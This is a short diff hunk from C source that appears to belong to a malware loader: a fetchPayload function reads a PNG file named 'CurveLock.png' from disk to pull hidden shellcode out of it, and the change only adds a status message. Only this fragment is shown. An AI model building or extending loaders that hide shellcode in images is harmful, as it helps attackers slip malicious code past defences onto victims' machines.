@@ -282,6 +282,8 @@ BOOL fetchPayload() {
 	SIZE_T sPngFileSize = 0x00;
 	SIZE_T sShellcodeSize = 0x00;
 
+	printf("[i] Extracting Payload from PNG File \n");
+
 	// Read PNG file from disk
 	if (!ReadFileFromDiskA("CurveLock.png", &pPngFileBuffer, &sPngFileSize))
 		return -1;
